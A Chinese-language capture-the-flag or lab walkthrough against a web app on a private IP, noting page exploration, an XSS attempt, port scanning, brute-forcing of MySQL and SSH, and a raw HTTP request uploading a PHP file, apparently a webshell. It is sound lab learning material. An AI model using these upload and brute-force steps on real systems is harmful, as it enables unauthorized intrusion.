> 打开url --> http://192.168.100.38/demo.php

![image-20240929094438298](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929094438298.png)

> 发现这几个图标,尝试点开每一个看一看

![image-20240929094624184](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929094624184.png)

![image-20240929111637872](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929111637872.png)

> 与此同时,查看path扫出的,页面看看

![image-20240929095247054](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929095247054.png)



> 没什么重大发现,去个人档案尝试文件上传,获得一个flag

![image-20240929100550136](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929100550136.png)

> 但是发现没办法访问到shell,使用伪协议 zip:// 也不行
>
> 开始尝试朋友圈

- 首先试试`xss`

![image-20240929101302722](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929101302722.png)

![image-20240929101321507](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929101321507.png)

> 与此同时尝试扫描端口,爆破3306,22端口

![image-20240929102752524](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929102752524.png)

![image-20240929102854165](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929102854165.png)

> 开始把重心放文件上传上面

```
POST /server/upload.php HTTP/1.1
Host: 192.168.100.38
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------38797450918855806354099648342
Content-Length: 89924
Origin: http://192.168.100.38
Connection: keep-alive
Referer: http://192.168.100.38/personal.php
Cookie: PHPSESSID=fckvntme1clbq2sk4mb2q7vb15
Upgrade-Insecure-Requests: 1
Priority: u=4

-----------------------------38797450918855806354099648342
Content-Disposition: form-data; name="file"; filename="1727575336_2.php"
...
![image-20240929115459697](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929115459697.png)

![image-20240929115243657](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929115243657.png)

![image-20240929115550959](C:/Users/24937/AppData/Roaming/Typora/typora-user-images/image-20240929115550959.png)